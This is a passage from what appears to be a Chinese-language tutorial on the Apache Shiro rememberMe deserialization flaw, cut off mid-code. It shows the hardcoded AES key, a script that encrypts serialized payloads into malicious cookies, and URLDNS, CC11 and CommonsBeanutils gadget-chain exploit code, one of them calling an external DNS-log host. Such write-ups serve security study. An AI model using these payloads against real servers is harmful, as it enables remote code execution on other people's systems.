class="hljs-operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        <br>        <span class="hljs-comment">// 将解密后的结果转换成字节数组</span><br>        serialized = byteSource.getBytes();<br>    &#125;<br>    <br>    <span class="hljs-comment">// 返回最终的字节数组（如果 cipherService 为 null，就原样返回输入的数据）</span><br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进调用的<code>decrypt()</code> ，发现它是一个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ByteSource <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] encrypted, <span class="hljs-type">byte</span>[] decryptionKey)</span> <span class="hljs-keyword">throws</span> CryptoException;<br></code></pre></td></tr></table></figure><p>说明这是一个对称加密，我们重点去关注一下 key</p><p>回到之前 <code>decrypt()</code> 方法，两个传参，第一个是 Cookie，第二个是 key，跟进传入的 <code>getDecryptionCipherKey</code></p><p>最终发现这个东西是个常量，过程如下</p><p>先点进 <code>getDecryptionCipherKey</code> 这个参数，进去之后发现这是一个 btye[] 的方法，返回了 <code>decryptionCipherKey</code>。<code>decryptionCipherKey</code> 这里，我们主要关注他是如何被赋值的</p><p>右键查找用法，找到setDecryptionCipherKey方法</p><p><img src="/img/shiro/s08.png"></p><p>继续查找用法</p><p><img src="/img/shiro/s09.png"></p><p>一直往前查找</p><p><img src="/img/shiro/s10.png"></p><p>发现 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>根据我们的解密过程，同理可推得加密过程</p><p>会先根据固定key进行AES加密，再对加密字符串base64编码</p><p>可以打断点验证一下，这里不再贴出过程</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们由shiro特性可知</p><p>最终的payload都是需要将反序列化的东西，进行 shiro 的一系列加密操作，再把最后的那串东西替换包中的 RememberMe 字段的值</p><p>这个加密操作的脚本如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"># －*-* coding:utf-<span class="hljs-number">8</span><br># <span class="hljs-meta">@Time</span>    :  <span class="hljs-number">2022</span>/<span class="hljs-number">7</span>/<span class="hljs-number">13</span> <span class="hljs-number">17</span>:<span class="hljs-number">36</span><br># <span class="hljs-meta">@Author</span>  : Drunkbaby<br># <span class="hljs-meta">@FileName</span>: poc.py<br># <span class="hljs-meta">@Software</span>: VSCode<br># <span class="hljs-meta">@Blog</span>    ：https:<span class="hljs-comment">//drun1baby.github.io/</span><br><br>from email.mime <span class="hljs-keyword">import</span> base<br>from pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br>from turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br>from random <span class="hljs-keyword">import</span> Random<br>from Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br>def <span class="hljs-title function_">get_file_data</span><span class="hljs-params">(filename)</span>:<br> with <span class="hljs-title function_">open</span><span class="hljs-params">(filename, <span class="hljs-string">&#x27;rb&#x27;</span>)</span> as f:<br> data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br>def <span class="hljs-title function_">aes_enc</span><span class="hljs-params">(data)</span>:<br> BS = AES.<span class="hljs-type">block_size</span><br> <span class="hljs-variable">pad</span> <span class="hljs-operator">=</span> lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.<span class="hljs-type">MODE_CBC</span><br> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> uuid.uuid4().<span class="hljs-type">bytes</span><br> <span class="hljs-variable">encryptor</span> <span class="hljs-operator">=</span> AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br>def <span class="hljs-title function_">aes_dec</span><span class="hljs-params">(enc_data)</span>:<br> enc_data = base64.b64decode(enc_data)<br> unpad = lambda s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.<span class="hljs-type">MODE_CBC</span><br> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> print(aes_enc(data))<br></code></pre></td></tr></table></figure><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>EXP直接用我们之前写好的链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNSEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// 这里不要发起请求  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://1108edl1y1aze5kd45jy0zn3muslgb40.oastify.com&quot;</span>);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br> serialize(hashmap);  <br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>先运行一下这个EXP得到ser.bin文件</p><p>再使用脚本将这个文件内容加密并base64编码，得到我们需要的恶意cookie</p><p>再将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe</p><p>前提是我们需要一个能够成功登录的用户和密码，再替换掉原本的cookie</p><p><img src="/img/shiro/s13.png"></p><p>之后会在DNSlog平台查找到DNS记录</p><h3 id="CC11链"><a href="#CC11链" class="headerlink" title="CC11链"></a>CC11链</h3><p>直接使用cc6链，发现有报错，显示的是无法加载Transform数组</p><p>说明我们要找一条不用到transform数组的链-&gt;链末尾要使用加载恶意字节码的类</p><p>我们现在要使用一条新的链子，将cc2，cc3与cc6链结合</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//CC3 末尾加载字节码部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-comment">//CC2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//先传入一个没有用的transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        lazyMap.remove(templates);<br><br>        <span class="hljs-comment">//反射修改lazyMap的参数factory的值</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,invokerTransformer);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考此流程图</p><p><img src="/img/CC4/c15.png"></p><p>得到精心构造的cookie后，我们抓取数据包传入此cookie</p><p><img src="/img/shiro/s14.png"></p><p>成功弹出计算器</p><h3 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h3><p>shiro框架本身是不带cc的依赖的，上次打cc依赖是我们自己加的，这次我们把这个cc依赖删掉，去打他本身的CB依赖（commons-beanutils）</p><p>javabean是一个遵循特定写法的Java类</p><p>特点：</p><ol><li>这个Java类必须有一个无参构造方法</li><li>属性必须私有化</li><li>私有化的属性必须通过public类型的方法暴露给其他程序，并且命名也遵循一定的命名规范</li></ol><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.exanple;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">// 无参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">// 有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">// getter &amp; setter</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果想获取Javabean的私有属性，我们只能通过以下这种方式获取，但是在CB中为了能够动态的获取Javabean的私有属性，所以构造了一个PropertyUtils.getProperty方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-number">18</span>);<br>        System.out.println(person.getName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PropertyUtils.getProperty的使用示例如下，他就会自动的去调用Person类的get方法，我们传入的是name属性，它会自动把这个属性的命名自动改为固定格式的形式，这里就会转为’Name’，调用的方法就是getName和setName方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-number">18</span>);<br>        System.out.println(PropertyUtils.getProperty(person,<span class="hljs-string">&quot;name&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要改变字符串就可以执行对应函数</p><p>从这里我们可以窥见getProperty函数中由动态执行的函数</p><h4 id="getOutputProperties方法"><a href="#getOutputProperties方法" class="headerlink" title="getOutputProperties方法"></a>getOutputProperties方法</h4><p>与CC3结合一下</p><p>在<code>TemplatesImpl</code>中有一个<code>getOutputProperties</code>方法，这个格式的命名就很符合Javabean，且他的方法调用了<code>newTransformer</code>方法，他是可以动态加载类的</p><p><img src="/img/shiro/s15.png"></p><p>尝试调用一下这个方法</p><p>与cc3结合,测试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.exanple;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行发现能够成功弹出计算器</p><h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>选中getProperty，查找用法</p><p>这里利用的是BeanComparator的compare方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.property == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.comparator.compare(o1, o2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.comparator.compare(value1, value2);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException iae) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + 